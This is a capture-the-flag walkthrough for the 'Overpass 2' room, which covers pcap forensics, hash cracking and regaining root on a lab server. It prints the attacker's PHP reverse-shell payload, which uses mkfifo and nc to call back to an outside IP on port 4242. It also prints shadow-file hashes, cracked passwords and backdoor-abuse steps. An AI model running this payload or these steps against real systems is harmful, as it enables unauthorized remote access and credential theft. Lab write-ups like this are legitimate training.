# Overpass 2 

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.

## Forensics 
** What was the URL of the page they used to upload a reverse shell? ** 
`tshark -r overpass2_1595383502269.pcapng -Y "http"`

```
    4 0.000326676 192.168.170.145 → 192.168.170.159 HTTP 484 GET /development/ HTTP/1.1 
    6 0.000860947 192.168.170.159 → 192.168.170.145 HTTP 1078 HTTP/1.1 200 OK  (text/html)
   14 7.915992166 192.168.170.145 → 192.168.170.159 HTTP 1026 POST /development/upload.php HTTP/1.1  (application/x-php)
   16 7.916964256 192.168.170.159 → 192.168.170.145 HTTP 309 HTTP/1.1 200 OK  (text/html)
   18 11.984825193 192.168.170.145 → 192.168.170.159 HTTP 401 GET /development/uploads/ HTTP/1.1 
   19 11.985407246 192.168.170.159 → 192.168.170.145 HTTP 788 HTTP/1.1 200 OK  (text/html)
   27 28.574178738 192.168.170.145 → 192.168.170.159 HTTP 466 GET /development/uploads/payload.php HTTP/1.1 
 3562 229.072082387 192.168.170.159 → 192.168.170.145 HTTP 224 GET /cooctus.png HTTP/1.1 
 3585 229.073323788 192.168.170.145 → 192.168.170.159 HTTP 15280 [TCP Spurious Retransmission] HTTP/1.0 200 OK  (PNG)
 3611 235.053124579 192.168.170.159 → 192.168.170.145 HTTP 223 GET /index.html HTTP/1.1 
 3619 235.053836457 192.168.170.145 → 192.168.170.159 HTTP 881 HTTP/1.0 200 OK  (text/html)
 3876 284.434399160 192.168.170.145 → 192.168.170.159 HTTP 472 GET / HTTP/1.1 
 3878 284.434823231 192.168.170.159 → 192.168.170.145 HTTP 788 HTTP/1.1 200 OK  (text/html)
 3880 284.443819303 192.168.170.145 → 192.168.170.159 HTTP 347 GET /cooctus.png HTTP/1.1 
 3890 284.444614924 192.168.170.159 → 192.168.170.145 HTTP 14119 HTTP/1.1 200 OK  (PNG)
```

GET /development/uploads/payload.php => Answer: `/development`

** What payload did the attacker use to gain access? **  
Insert filter `http.request.method == POST` and follow stream of uploaded payload 
Answer: `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

** What password did the attacker use to privesc? ** 
Used password `whenevernoteartinstant`

** How did the attacker establish persistence?** 
Retrieved `https://github.com/NinjaJc01/ssh-backdoor`

** Using the fasttrack wordlist, how many of the system passwords were crackable? ** 
Attacker read shadowfile: 

```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

Using fasttrack, john was able to crack the following passwords: 
```
secuirty3		(paradox)
abcd123         (szymex)   
secret12		(bee)  
1qaz2wsx        (muirland)     
```

## Research
`cat main.go`

**What's the default hash for the backdoor?** 
`bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

**What's the hardcoded salt for the backdoor?**
`1c362db832f3f864c8c2fe05f2002a05`

**What was the hash that the attacker used? - go back to the PCAP for this!**
`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

**Crack the hash using rockyou and a cracking tool of your choice. What's the password?**
`november16`

## Attack
**The attacker defaced the website. What message did they leave as a heading?**
`H4ck3d by CooctusClan` 

**Using the information you've found previously, hack your way back in!**
`ssh -p 2222 james@10.80.160.210 -oHostKeyAlgorithms=+ssh-rsa`

Root obtained by: 
`find / -perm u=s -type f 2>/dev/null` or `ls -la`
	`./.suid_bash -p` => Shell as root 

